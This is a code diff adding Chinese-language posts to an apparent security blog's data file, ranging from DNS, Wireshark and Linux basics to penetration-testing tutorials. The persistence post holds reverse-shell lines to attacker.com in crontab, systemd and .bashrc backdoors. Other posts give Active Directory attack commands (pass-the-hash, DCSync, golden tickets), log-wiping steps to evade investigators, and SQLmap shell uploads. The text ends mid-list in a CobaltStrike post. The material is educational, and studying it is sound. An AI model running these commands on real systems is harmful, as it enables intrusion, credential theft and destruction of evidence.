@@ -83,7 +83,1534 @@ export const categories = [
 ]
 
 export const posts = [
-  // 计算机网络
+  // 计算机网络 - DNS
+  {
+    slug: 'dns-resolution',
+    title: 'DNS 解析原理详解',
+    date: '2026-06-17',
+    category: 'network',
+    subcategory: 'dns',
+    tags: ['网络', 'DNS', '基础'],
+    summary: 'DNS 解析流程、记录类型、常见攻击和安全配置。',
+    content: `
+## 什么是 DNS
+
+DNS（Domain Name System）域名系统，将域名转换为 IP 地址。
+
+## 解析流程
+
+1. **浏览器缓存** → 2. **系统缓存** → 3. **hosts 文件** → 4. **本地 DNS 服务器** → 5. **根域名服务器** → 6. **顶级域名服务器** → 7. **权威域名服务器**
+
+## 记录类型
+
+| 记录 | 说明 | 示例 |
+|------|------|------|
+| A | 域名 → IPv4 | example.com → 93.184.216.34 |
+| AAAA | 域名 → IPv6 | |
+| CNAME | 别名记录 | www → example.com |
+| MX | 邮件服务器 | |
+| NS | 域名服务器 | |
+| TXT | 文本记录 | SPF/DKIM |
+| SRV | 服务记录 | |
+| PTR | 反向解析 | IP → 域名 |
+
+## DNS 工具
+
+\`\`\`bash
+# 查询 A 记录
+nslookup example.com
+dig example.com A
+
+# 查询所有记录
+dig example.com ANY
+
+# 指定 DNS 服务器
+dig @8.8.8.8 example.com
+
+# 反向解析
+dig -x 93.184.216.34
+
+# 追踪解析过程
+dig +trace example.com
+\`\`\`
+
+## DNS 安全
+
+### DNS 劫持
+攻击者篡改 DNS 响应，将用户引导到恶意网站。
+
+### DNS 缓存投毒
+污染 DNS 缓存，使后续查询返回错误结果。
+
+### 防御
+- 使用 DNSSEC
+- 使用 DoH（DNS over HTTPS）
+- 使用 DoT（DNS over TLS）
+    `
+  },
+  {
+    slug: 'wireshark-capture',
+    title: 'Wireshark 抓包分析指南',
+    date: '2026-06-16',
+    category: 'network',
+    subcategory: 'wireshark',
+    tags: ['网络', 'Wireshark', '流量分析'],
+    summary: 'Wireshark 抓包工具的使用方法和过滤技巧。',
+    content: `
+## Wireshark 简介
+
+Wireshark 是最流行的网络协议分析器，支持深度包检测。
+
+## 基本操作
+
+### 开始抓包
+1. 选择网卡
+2. 点击开始按钮
+3. 设置捕获过滤器
+
+### 停止抓包
+点击停止按钮或 Ctrl+E
+
+## 显示过滤器
+
+### 协议过滤
+\`\`\`
+http
+tcp
+dns
+icmp
+\`\`\`
+
+### IP 过滤
+\`\`\`
+ip.addr == 192.168.1.1
+ip.src == 192.168.1.1
+ip.dst == 10.0.0.1
+\`\`\`
+
+### 端口过滤
+\`\`\`
+tcp.port == 80
+tcp.dstport == 443
+udp.port == 53
+\`\`\`
+
+### HTTP 过滤
+\`\`\`
+http.request.method == "POST"
+http.response.code == 200
+http.host contains "example"
+http.url contains "login"
+\`\`\`
+
+### TCP 过滤
+\`\`\`
+tcp.flags.syn == 1
+tcp.flags.rst == 1
+tcp.stream eq 5
+\`\`\`
+
+### 组合过滤
+\`\`\`
+http && ip.src == 192.168.1.1
+(tcp.port == 80 || tcp.port == 443) && http
+\`\`\`
+
+## 常用分析技巧
+
+### 追踪 TCP 流
+右键 → Follow → TCP Stream
+
+### 提取文件
+File → Export Objects → HTTP/DICOM/SMB/TFTP
+
+### 统计信息
+Statistics → Conversations / Protocol Hierarchy / Endpoints
+
+## 实战场景
+
+### 分析 HTTP 请求
+\`\`\`
+http.request.method == "POST" && http.request.uri contains "login"
+\`\`\`
+
+### 捕获密码
+\`\`\`
+http.request.method == "POST"
+# 然后 Follow TCP Stream 查看明文
+\`\`\`
+
+### DNS 查询
+\`\`\`
+dns.qry.name contains "example"
+\`\`\`
+    `
+  },
+  // Linux 系统
+  {
+    slug: 'linux-commands',
+    title: 'Linux 常用命令速查',
+    date: '2026-06-20',
+    category: 'linux',
+    subcategory: 'linux-commands',
+    tags: ['Linux', '命令', '基础'],
+    summary: '渗透测试和日常运维中最常用的 Linux 命令。',
+    content: `
+## 文件操作
+
+\`\`\`bash
+ls -la          # 列出文件（含隐藏）
+cd /path        # 切换目录
+pwd             # 当前目录
+mkdir -p dir    # 创建目录
+cp -r src dst   # 复制
+mv src dst      # 移动/重命名
+rm -rf dir      # 删除
+find / -name "*.conf"  # 查找文件
+locate filename # 快速查找
+\`\`\`
+
+## 文件内容
+
+\`\`\`bash
+cat file        # 查看文件
+less file       # 分页查看
+head -n 20 file # 前20行
+tail -f file    # 实时查看
+grep "pattern" file  # 搜索
+grep -rn "keyword" /path  # 递归搜索
+wc -l file      # 统计行数
+\`\`\`
+
+## 权限管理
+
+\`\`\`bash
+chmod 755 file  # 修改权限
+chown user:group file  # 修改所有者
+sudo command    # 以root执行
+su - user       # 切换用户
+\`\`\`
+
+## 网络相关
+
+\`\`\`bash
+ifconfig / ip a # 查看IP
+netstat -tlnp   # 查看端口
+ss -tlnp        # 查看端口（新）
+curl url        # HTTP请求
+wget url        # 下载
+ping host       # 测试连通
+traceroute host # 路由追踪
+\`\`\`
+
+## 进程管理
+
+\`\`\`bash
+ps aux          # 查看进程
+top / htop      # 实时进程
+kill -9 PID     # 强制结束
+nohup cmd &     # 后台运行
+crontab -e      # 定时任务
+\`\`\`
+
+## 压缩解压
+
+\`\`\`bash
+tar -czf archive.tar.gz dir/  # 压缩
+tar -xzf archive.tar.gz       # 解压
+unzip file.zip                 # 解压zip
+\`\`\`
+
+## 常用组合
+
+\`\`\`bash
+# 查找SUID文件
+find / -perm -4000 2>/dev/null
+
+# 查找可写目录
+find / -writable -type d 2>/dev/null
+
+# 查看历史命令
+history | grep "keyword"
+
+# 批量杀进程
+killall process_name
+\`\`\`
+    `
+  },
+  {
+    slug: 'linux-users',
+    title: 'Linux 用户与权限管理',
+    date: '2026-06-19',
+    category: 'linux',
+    subcategory: 'linux-users',
+    tags: ['Linux', '权限', '用户管理'],
+    summary: 'Linux 用户管理、文件权限、sudo 配置和提权方法。',
+    content: `
+## 用户管理
+
+\`\`\`bash
+useradd username    # 创建用户
+passwd username     # 设置密码
+userdel username    # 删除用户
+usermod -aG sudo username  # 添加到sudo组
+id username         # 查看用户信息
+whoami              # 当前用户
+\`\`\`
+
+## 文件权限
+
+### 权限说明
+\`\`\`
+-rwxr-xr--
+│└┬┘└┬┘└┬┘
+│ │  │  └── 其他用户：读
+│ │  └───── 所属组：读+执行
+│ └──────── 所有者：读+写+执行
+└────────── 文件类型（-普通 d目录 l链接）
+\`\`\`
+
+### 修改权限
+\`\`\`bash
+chmod 755 file      # rwxr-xr-x
+chmod u+x file      # 所有者加执行
+chmod g-w file      # 组去掉写
+chmod o-rwx file    # 其他无权限
+\`\`\`
+
+### 特殊权限
+\`\`\`bash
+chmod u+s file      # SUID：执行时以所有者身份
+chmod g+s dir       # SGID：目录下新文件继承组
+chmod +t dir        # Sticky Bit：只有所有者能删除
+\`\`\`
+
+## SUID 提权
+
+\`\`\`bash
+# 查找SUID文件
+find / -perm -4000 2>/dev/null
+
+# 常见可提权SUID
+/usr/bin/find -exec /bin/sh \\;
+/usr/bin/vim -c ':!sh'
+/usr/bin/nmap --interactive
+\`\`\`
+
+## sudo 配置
+
+\`\`\`bash
+# 查看sudo权限
+sudo -l
+
+# 编辑sudoers
+visudo
+
+# 允许执行特定命令
+username ALL=(ALL) /usr/bin/vim
+\`\`\`
+
+## /etc/passwd 和 /etc/shadow
+
+\`\`\`bash
+# passwd 可读，包含用户信息
+cat /etc/passwd
+
+# shadow 包含密码哈希（需root）
+cat /etc/shadow
+\`\`\`
+    `
+  },
+  {
+    slug: 'linux-process',
+    title: 'Linux 进程与服务管理',
+    date: '2026-06-18',
+    category: 'linux',
+    subcategory: 'linux-process',
+    tags: ['Linux', '进程', '服务'],
+    summary: 'Linux 进程管理、服务配置和定时任务。',
+    content: `
+## 进程管理
+
+\`\`\`bash
+ps aux              # 查看所有进程
+ps -ef              # 完整格式
+top                 # 实时进程
+htop                # 增强版top
+pstree              # 进程树
+\`\`\`
+
+## 进程操作
+
+\`\`\`bash
+kill PID            # 终止进程（SIGTERM）
+kill -9 PID         # 强制终止（SIGKILL）
+killall name        # 按名称终止
+pkill name          # 按模式终止
+nohup cmd &         # 后台运行
+jobs                # 查看后台任务
+fg %1               # 调回前台
+\`\`\`
+
+## Systemd 服务
+
+\`\`\`bash
+systemctl status service     # 查看状态
+systemctl start service      # 启动
+systemctl stop service       # 停止
+systemctl restart service    # 重启
+systemctl enable service     # 开机启动
+systemctl disable service    # 禁用开机启动
+systemctl list-units --type=service  # 列出服务
+\`\`\`
+
+## 定时任务 Crontab
+
+\`\`\`bash
+crontab -e          # 编辑定时任务
+crontab -l          # 查看定时任务
+
+# 格式：分 时 日 月 周 命令
+# 每天凌晨3点执行
+0 3 * * * /path/to/script.sh
+
+# 每5分钟执行
+*/5 * * * * /path/to/script.sh
+
+# 每周一执行
+0 0 * * 1 /path/to/script.sh
+\`\`\`
+
+## 日志管理
+
+\`\`\`bash
+# 常见日志位置
+/var/log/syslog          # 系统日志
+/var/log/auth.log        # 认证日志
+/var/log/apache2/        # Apache日志
+/var/log/nginx/          # Nginx日志
+\`\`\`
+
+## 开机启动项
+
+\`\`\`bash
+# 查看启动服务
+systemctl list-unit-files --type=service
+
+# 查看rc.local
+cat /etc/rc.local
+\`\`\`
+    `
+  },
+  {
+    slug: 'linux-network',
+    title: 'Linux 网络配置管理',
+    date: '2026-06-17',
+    category: 'linux',
+    subcategory: 'linux-network',
+    tags: ['Linux', '网络', '配置'],
+    summary: 'Linux 网络配置、防火墙、VPN 和流量管理。',
+    content: `
+## 网络配置
+
+\`\`\`bash
+ip addr              # 查看IP地址
+ip link              # 查看网络接口
+ip route             # 查看路由表
+ifconfig             # 传统方式（部分系统）
+\`\`\`
+
+## 端口管理
+
+\`\`\`bash
+netstat -tlnp        # 查看监听端口
+ss -tlnp             # 更快的方式
+lsof -i :80          # 查看端口占用
+\`\`\`
+
+## 防火墙
+
+### iptables
+\`\`\`bash
+iptables -L -n       # 查看规则
+iptables -A INPUT -p tcp --dport 80 -j ACCEPT  # 允许80端口
+iptables -A INPUT -j DROP  # 默认拒绝
+\`\`\`
+
+### firewalld
+\`\`\`bash
+firewall-cmd --state          # 状态
+firewall-cmd --list-all       # 查看规则
+firewall-cmd --add-port=80/tcp --permanent  # 开放端口
+firewall-cmd --reload         # 重载
+\`\`\`
+
+## DNS 配置
+
+\`\`\`bash
+# /etc/resolv.conf
+nameserver 8.8.8.8
+nameserver 114.114.114.114
+\`\`\`
+
+## hosts 文件
+
+\`\`\`bash
+# /etc/hosts
+127.0.0.1 localhost
+192.168.1.100 target.com
+\`\`\`
+
+## 网络诊断
+
+\`\`\`bash
+ping host           # 连通性测试
+traceroute host     # 路由追踪
+nslookup domain     # DNS查询
+dig domain          # 详细DNS查询
+curl -v url         # HTTP调试
+tcpdump -i eth0     # 抓包
+\`\`\`
+
+## SSH 配置
+
+\`\`\`bash
+ssh user@host               # 连接
+ssh -p 2222 user@host       # 指定端口
+scp file user@host:/path    # 传输文件
+ssh-keygen -t rsa           # 生成密钥
+ssh-copy-id user@host       # 复制公钥
+\`\`\`
+    `
+  },
+  // 攻防对抗 - 补充
+  {
+    slug: 'persistence-techniques',
+    title: '权限维持技术',
+    date: '2026-06-07',
+    category: 'attack-defense',
+    subcategory: 'persistence',
+    tags: ['渗透测试', '权限维持', '后门'],
+    summary: '常见权限维持方法和后门技术。',
+    content: `
+## 权限维持方法
+
+### 1. SSH 公钥后门
+
+\`\`\`bash
+# 写入公钥
+echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+\`\`\`
+
+### 2. Crontab 定时任务
+
+\`\`\`bash
+# 每分钟执行反弹shell
+* * * * * /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+\`\`\`
+
+### 3. Systemd 服务
+
+\`\`\`ini
+# /etc/systemd/system/backdoor.service
+[Unit]
+Description=System Service
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+Restart=always
+
+[Install]
+WantedBy=multi-user.target
+\`\`\`
+
+### 4. .bashrc 后门
+
+\`\`\`bash
+# ~/.bashrc
+if [[ $- != *i* ]]; then
+    /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &
+fi
+\`\`\`
+
+### 5. 命令别名
+
+\`\`\`bash
+# ~/.bashrc
+alias ls='ls; /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1" &'
+\`\`\`
+
+### 6. SUID 后门
+
+\`\`\`bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+\`\`\`
+
+### 7. /etc/passwd 后门
+
+\`\`\`bash
+# 添加一个uid=0的用户
+echo 'hacker:$6$xxx:0:0::/root:/bin/bash' >> /etc/passwd
+\`\`\`
+
+## Windows 权限维持
+
+### 注册表自启动
+
+\`\`\`powershell
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+\`\`\`
+
+### 计划任务
+
+\`\`\`powershell
+schtasks /create /tn "backdoor" /tr "C:\\backdoor.exe" /sc minute /mo 1
+\`\`\`
+
+### 服务后门
+
+\`\`\`powershell
+sc create backdoor binPath= "C:\\backdoor.exe" start= auto
+\`\`\`
+
+## 检测方法
+
+- 检查 Crontab 异常任务
+- 检查 /etc/passwd 新用户
+- 检查 SUID 文件
+- 检查异常进程
+- 检查启动项
+    `
+  },
+  {
+    slug: 'lateral-movement',
+    title: '横向移动技术',
+    date: '2026-06-06',
+    category: 'attack-defense',
+    subcategory: 'lateral',
+    tags: ['渗透测试', '横向移动', '内网'],
+    summary: '内网横向移动的常见方法和工具。',
+    content: `
+## 横向移动方法
+
+### 1. IPC$ 命名管道
+
+\`\`\`cmd
+# 连接
+net use \\\\target\\ipc$ "password" /user:administrator
+
+# 复制文件
+copy shell.exe \\\\target\\C$\\Windows\\Temp\\
+
+# 执行
+sc \\\\target create service binPath= "C:\\Windows\\Temp\\shell.exe"
+\`\`\`
+
+### 2. PsExec
+
+\`\`\`cmd
+psexec \\\\target -u admin -p pass cmd.exe
+psexec \\\\target -u admin -p pass -c shell.exe
+\`\`\`
+
+### 3. WMI
+
+\`\`\`cmd
+wmic /node:target /user:admin /password:pass process call create "cmd.exe /c whoami > C:\\temp\\out.txt"
+\`\`\`
+
+### 4. WinRM
+
+\`\`\`powershell
+# 远程执行
+Invoke-Command -ComputerName target -ScriptBlock { whoami }
+\`\`\`
+
+### 5. RDP
+
+\`\`\`cmd
+mstsc /v:target
+xfreerdp /v:target /u:admin /p:pass
+\`\`\`
+
+### 6. SMB
+
+\`\`\`cmd
+# 使用 impacket
+psexec.py admin:pass@target
+wmiexec.py admin:pass@target
+smbexec.py admin:pass@target
+\`\`\`
+
+### 7. Pass the Hash
+
+\`\`\`cmd
+# 使用 mimikatz 获取哈希
+sekurlsa::logonpasswords
+
+# 使用哈希连接
+psexec.py -hashes aad3b435...:f1f4d... admin@target
+\`\`\`
+
+## 工具
+
+- **Impacket**：Python 网络协议工具包
+- **CrackMapExec**：批量内网渗透
+- **BloodHound**：AD 环境分析
+- **Responder**：LLMNR/NBT-NS 欺骗
+
+## 检测
+
+- 监控异常登录
+- 检查日志中的横向移动特征
+- 网络流量分析
+    `
+  },
+  {
+    slug: 'anti-forensics',
+    title: '反溯源与日志清理',
+    date: '2026-06-04',
+    category: 'attack-defense',
+    subcategory: 'anti-forensics',
+    tags: ['渗透测试', '反溯源', '日志'],
+    summary: '渗透测试中的反溯源技术日志清理方法。',
+    content: `
+## 反溯源方法
+
+### 1. 使用代理/VPS
+
+\`\`\`bash
+# 使用 proxychains
+proxychains nmap -sV target.com
+
+# SSH 代理
+ssh -D 1080 user@vps
+\`\`\`
+
+### 2. 修改 MAC 地址
+
+\`\`\`bash
+ifconfig eth0 hw ether 00:11:22:33:44:55
+macchanger -r eth0
+\`\`\`
+
+### 3. 修改主机名
+
+\`\`\`bash
+hostnamectl set-hostname random-name
+\`\`\`
+
+### 4. 使用临时工具
+
+\`\`\`bash
+# 在 /tmp 下操作，重启后自动清理
+cd /tmp
+\`\`\`
+
+## 日志清理
+
+### Linux 日志
+
+\`\`\`bash
+# 清除登录日志
+echo > /var/log/auth.log
+echo > /var/log/secure
+
+# 清除命令历史
+history -c
+unset HISTFILE
+rm ~/.bash_history
+
+# 清除特定日志条目
+sed -i '/attacker_ip/d' /var/log/auth.log
+
+# 清除 utmp/wtmp/btmp
+echo > /var/log/wtmp
+echo > /var/log/btmp
+\`\`\`
+
+### Windows 日志
+
+\`\`\`powershell
+# 清除安全日志
+wevtutil cl Security
+
+# 清除系统日志
+wevtutil cl System
+
+# 清除应用日志
+wevtutil cl Application
+
+# PowerShell 历史
+Remove-Item (Get-PSReadLineOption).HistorySavePath
+\`\`\`
+
+## 时间戳修改
+
+\`\`\`bash
+# 修改文件时间戳
+touch -r reference_file target_file
+timestomp target_file -m "01/01/2020 00:00:00"
+\`\`\`
+
+## 注意事项
+
+- 不要清理所有日志（会触发告警）
+- 只删除特定条目
+- 保留正常日志结构
+- 注意文件时间戳
+    `
+  },
+  // 域渗透 - 补充
+  {
+    slug: 'domain-recon',
+    title: '域信息收集',
+    date: '2026-05-24',
+    category: 'domain',
+    subcategory: 'domain-recon',
+    tags: ['域渗透', '信息收集', 'Active Directory'],
+    summary: '域环境下的信息收集方法和工具。',
+    content: `
+## 基本信息
+
+\`\`\`powershell
+# 当前域信息
+net config workstation
+nltest /dclist:domain.com
+nltest /domain_trusts
+
+# 域用户
+net user /domain
+
+# 域组
+net group /domain
+net group "Domain Admins" /domain
+
+# 域控
+nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.com
+\`\`\`
+
+## LDAP 查询
+
+\`\`\`powershell
+# 使用 ldapsearch
+ldapsearch -x -h domain.com -b "DC=domain,DC=com"
+
+# 使用 PowerShell
+Get-ADUser -Filter * -Properties *
+Get-ADComputer -Filter * -Properties *
+Get-ADGroup -Filter *
+\`\`\`
+
+## BloodHound
+
+\`\`\`bash
+# 数据收集
+bloodhound-python -u admin -p pass -d domain.com -c All
+
+# SharpHound
+./SharpHound.exe -c All
+\`\`\`
+
+## 常用工具
+
+- **enum4linux**：SMB 枚举
+- **ldapsearch**：LDAP 查询
+- **BloodHound**：AD 路径分析
+- **ADRecon**：AD 环境报告
+
+## 信息收集内容
+
+1. 域名、域 SID
+2. 域控制器列表
+3. 域用户和组
+4. 信任关系
+5. 共享资源
+6. 策略配置
+    `
+  },
+  {
+    slug: 'domain-attack',
+    title: '域控攻击技术',
+    date: '2026-05-23',
+    category: 'domain',
+    subcategory: 'domain-attack',
+    tags: ['域渗透', '域控', 'Active Directory'],
+    summary: '获取域控制器权限的常见方法。',
+    content: `
+## 域控攻击方法
+
+### 1. Kerberoasting
+
+\`\`\`powershell
+# 请求服务票据
+Add-Type -AssemblyName System.IdentityModel
+$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+foreach ($spn in $spns) {
+    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentName $spn.ServicePrincipalName
+}
+
+# 使用 Rubeus
+Rubeus.exe kerberoast /outfile:hashes.txt
+\`\`\`
+
+### 2. AS-REP Roasting
+
+\`\`\`powershell
+# 查找不需要预认证的用户
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth
+
+# 使用 Rubeus
+Rubeus.exe asreproast /outfile:hashes.txt
+\`\`\`
+
+### 3. Pass the Hash
+
+\`\`\`cmd
+# 使用 mimikatz
+sekurlsa::logonpasswords
+lsadump::lsa /patch
+
+# 使用 impacket
+psexec.py -hashes aad3b435...:f1f4d... administrator@dc.domain.com
+\`\`\`
+
+### 4. DCSync
+
+\`\`\`powershell
+# 使用 mimikatz
+lsadump::dcsync /user:krbtgt
+
+# 使用 impacket
+secretsdump.py domain/admin:pass@dc.domain.com -just-dc-ntlm
+\`\`\`
+
+### 5. Golden Ticket
+
+\`\`\`powershell
+# 需要 krbtgt 哈希
+kerberos::golden /user:administrator /domain:domain.com /sid:S-1-5-21-... /krbtgt:hash /ticket:golden.kirbi
+\`\`\`
+
+## 防御
+
+- 监控异常 SPN 请求
+- 限制 DCSync 权限
+- 定期更改 krbtgt 密码
+- 启用 LAPS
+    `
+  },
+  {
+    slug: 'domain-techniques',
+    title: '域渗透常见攻击手法',
+    date: '2026-05-22',
+    category: 'domain',
+    subcategory: 'domain-techniques',
+    tags: ['域渗透', 'Kerberos', 'NTLM'],
+    summary: '域渗透中的常见攻击技术和利用方法。',
+    content: `
+## Kerberos 攻击
+
+### Pass the Ticket
+
+\`\`\`powershell
+# 导出票据
+mimikatz # kerberos::list /export
+
+# 导入票据
+mimikatz # kerberos::ptt ticket.kirbi
+\`\`\`
+
+### Silver Ticket
+
+\`\`\`powershell
+# 伪造服务票据
+mimikatz # kerberos::golden /user:admin /domain:domain.com /sid:S-1-5-21-... /target:server.domain.com /service:http /rc4:hash /ptt
+\`\`\`
+
+## NTLM 攻击
+
+### NTLM Relay
+
+\`\`\`bash
+# 使用 impacket
+ntlmrelayx.py -t dc.domain.com -smb2support
+
+# 使用 Responder
+responder -I eth0 -wrf
+\`\`\`
+
+### Pass the NTLM
+
+\`\`\`cmd
+# 使用 mimikatz
+sekurlsa::pth /user:admin /domain:domain.com /ntlm:hash /run:cmd.exe
+\`\`\`
+
+## 委派攻击
+
+### 非约束委派
+
+\`\`\`powershell
+# 查找配置非约束委派的机器
+Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+\`\`\`
+
+### 约束委派
+
+\`\`\`powershell
+# 查找约束委派
+Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+\`\`\`
+
+## 常用工具
+
+- **Rubeus**：Kerberos 攻击
+- **Mimikatz**：凭据获取
+- **Impacket**：网络协议攻击
+- **Responder**：LLMNR/NBT-NS 欺骗
+    `
+  },
+  // 应急响应 - 补充
+  {
+    slug: 'linux-ir',
+    title: 'Linux 应急响应',
+    date: '2026-05-27',
+    category: 'ir',
+    subcategory: 'ir-linux',
+    tags: ['应急响应', 'Linux', '安全'],
+    summary: 'Linux 系统安全事件应急响应流程。',
+    content: `
+## 排查步骤
+
+### 1. 账户安全
+
+\`\`\`bash
+# 检查新增用户
+cat /etc/passwd | grep -v nologin
+awk -F: '$3==0{print $1}' /etc/passwd
+
+# 检查密码文件
+cat /etc/shadow
+
+# 检查sudo配置
+cat /etc/sudoers
+\`\`\`
+
+### 2. 进程排查
+
+\`\`\`bash
+# 查看异常进程
+ps aux | grep -v root | sort -nrk 3 | head
+
+# 查看网络连接进程
+netstat -antlp | grep ESTABLISHED
+
+# 查看可疑进程
+ls -la /proc/PID/exe
+\`\`\`
+
+### 3. 文件排查
+
+\`\`\`bash
+# 查找最近修改的文件
+find / -mtime -1 -type f
+
+# 查找SUID文件
+find / -perm -4000 -type f
+
+# 查找可写目录
+find / -writable -type d
+
+# 检查/tmp目录
+ls -la /tmp/
+\`\`\`
+
+### 4. 日志分析
+
+\`\`\`bash
+# 登录日志
+last
+lastb
+lastlog
+
+# 认证日志
+grep "Failed password" /var/log/auth.log
+grep "Accepted password" /var/log/auth.log
+\`\`\`
+
+### 5. 启动项
+
+\`\`\`bash
+# 检查crontab
+crontab -l
+ls -la /etc/cron*
+
+# 检查systemd服务
+systemctl list-unit-files --type=service
+\`\`\`
+
+## 常见攻击痕迹
+
+- 异常进程
+- 新增用户
+- SUID 文件
+- 异常计划任务
+- 异常网络连接
+    `
+  },
+  {
+    slug: 'windows-ir',
+    title: 'Windows 应急响应',
+    date: '2026-05-26',
+    category: 'ir',
+    subcategory: 'ir-windows',
+    tags: ['应急响应', 'Windows', '安全'],
+    summary: 'Windows 系统安全事件应急响应流程。',
+    content: `
+## 排查步骤
+
+### 1. 账户安全
+
+\`\`\`powershell
+# 查看用户
+net user
+net localgroup administrators
+
+# 查看隐藏用户
+reg query "HKLM\\SAM\\SAM\\Domains\\Account\\Users"
+
+# 检查账户枚举
+wmic useraccount list full
+\`\`\`
+
+### 2. 进程排查
+
+\`\`\`powershell
+# 查看进程
+tasklist /v
+Get-Process | Select-Object Id, ProcessName, Path
+
+# 查看网络连接
+netstat -ano | findstr ESTABLISHED
+
+# 使用 Process Explorer
+\`\`\`
+
+### 3. 文件排查
+
+\`\`\`powershell
+# 查找最近修改的文件
+forfiles /P C:\\ /S /D +0 /C "cmd /c echo @path @fdate @ftime"
+
+# 检查启动目录
+dir "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+\`\`\`
+
+### 4. 日志分析
+
+\`\`\`powershell
+# 安全日志
+wevtutil qe Security /c:100 /f:text
+
+# 登录事件ID
+# 4624 - 登录成功
+# 4625 - 登录失败
+# 4648 - 明文登录
+# 4720 - 创建用户
+\`\`\`
+
+### 5. 注册表排查
+
+\`\`\`powershell
+# 自启动项
+reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+\`\`\`
+
+## 工具
+
+- **Autoruns**：启动项分析
+- **Process Explorer**：进程分析
+- **Process Monitor**：行为监控
+- **WinPEAS**：提权检查
+    `
+  },
+  // 工具手册 - 补充
+  {
+    slug: 'sqlmap-guide',
+    title: 'SQLmap 使用指南',
+    date: '2026-05-30',
+    category: 'tools',
+    subcategory: 'sqlmap',
+    tags: ['工具', 'SQLmap', 'SQL注入'],
+    summary: 'SQLmap 自动化 SQL 注入检测和利用工具。',
+    content: `
+## 基本用法
+
+\`\`\`bash
+# 检测注入
+sqlmap -u "http://target/?id=1"
+
+# 获取数据库
+sqlmap -u "http://target/?id=1" --dbs
+
+# 获取表
+sqlmap -u "http://target/?id=1" -D mydb --tables
+
+# 获取数据
+sqlmap -u "http://target/?id=1" -D mydb -T users --dump
+\`\`\`
+
+## POST 注入
+
+\`\`\`bash
+# 从 Burp 导出请求
+sqlmap -r request.txt
+
+# 指定参数
+sqlmap -u "http://target/login" --data="user=admin&pass=123" -p user
+
+# 指定方法
+sqlmap -u "http://target/login" --data="user=admin&pass=123" --method=POST
+\`\`\`
+
+## 高级选项
+
+\`\`\`bash
+# 执行系统命令
+sqlmap -u "http://target/?id=1" --os-shell
+
+# 读取文件
+sqlmap -u "http://target/?id=1" --file-read="/etc/passwd"
+
+# 写入文件
+sqlmap -u "http://target/?id=1" --file-write="shell.php" --file-dest="/var/www/shell.php"
+
+# 使用代理
+sqlmap -u "http://target/?id=1" --proxy="http://127.0.0.1:8080"
+
+# 绕过WAF
+sqlmap -u "http://target/?id=1" --tamper=space2comment,between --random-agent
+\`\`\`
+
+## Tamper 脚本
+
+\`\`\`bash
+# 常用tamper
+space2comment     # 空格→注释
+between           # >→BETWEEN, =→LIKE
+charencode        # URL编码
+randomcase        # 随机大小写
+unionall          # UNION ALL替换UNION
+\`\`\`
+
+## 输出控制
+
+\`\`\`bash
+# 保存日志
+sqlmap -u "http://target/?id=1" --output-dir=/tmp/sqlmap
+
+# 只检测不利用
+sqlmap -u "http://target/?id=1" --batch --level=1
+
+# 指定数据库类型
+sqlmap -u "http://target/?id=1" --dbms=mysql
+\`\`\`
+    `
+  },
+  {
+    slug: 'nuclei-guide',
+    title: 'Nuclei 漏洞扫描指南',
+    date: '2026-05-28',
+    category: 'tools',
+    subcategory: 'nuclei',
+    tags: ['工具', 'Nuclei', '漏洞扫描'],
+    summary: 'Nuclei 基于模板的快速漏洞扫描器。',
+    content: `
+## 基本用法
+
+\`\`\`bash
+# 扫描单个目标
+nuclei -u http://target.com
+
+# 批量扫描
+nuclei -l urls.txt
+
+# 指定模板
+nuclei -u http://target.com -t cves/
+
+# 输出结果
+nuclei -u http://target.com -o results.txt
+\`\`\`
+
+## 模板管理
+
+\`\`\`bash
+# 更新模板
+nuclei -update-templates
+
+# 查看模板
+nuclei -tl
+
+# 按标签扫描
+nuclei -u http://target.com -tags cve,rce
+
+# 按严重程度
+nuclei -u http://target.com -severity critical,high
+\`\`\`
+
+## 高级用法
+
+\`\`\`bash
+# 使用代理
+nuclei -u http://target.com -proxy http://127.0.0.1:8080
+
+# 并发控制
+nuclei -l urls.txt -c 50
+
+# 排除模板
+nuclei -u http://target.com -exclude-tags dos
+
+# 自定义模板
+nuclei -u http://target.com -t custom-template.yaml
+\`\`\`
+
+## 自定义模板
+
+\`\`\`yaml
+id: custom-sqli
+info:
+  name: Custom SQL Injection
+  severity: high
+  description: Detects SQL injection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?id=1'"
+    matchers:
+      - type: word
+        words:
+          - "SQL syntax"
+          - "mysql"
+        condition: or
+\`\`\`
+
+## 常用参数
+
+| 参数 | 说明 |
+|------|------|
+| -u | 目标URL |
+| -l | 目标列表 |
+| -t | 模板目录 |
+| -severity | 严重程度 |
+| -tags | 标签过滤 |
+| -proxy | 代理 |
+| -o | 输出文件 |
+| -json | JSON格式输出 |
+    `
+  },
+  {
+    slug: 'cobaltstrike-guide',
+    title: 'CobaltStrike 使用指南',
+    date: '2026-05-25',
+    category: 'tools',
+    subcategory: 'cobaltstrike',
+    tags: ['工具', 'CobaltStrike', '红队', 'C2'],
+    summary: 'CobaltStrike 红队 C2 框架基础使用。',
+    content: `
+## CobaltStrike 简介
+
+CobaltStrike 是商业级渗透测试平台，提供 C2（Command and Control）能力。
+
+## 核心功能
+
+### Listeners（监听器）
+- HTTP/HTTPS Beacon
+- DNS Beacon
+- SMB Beacon
+- TCP Beacon
+
+### Attacks（攻击）
+- Web Drive-by（钓鱼网站）
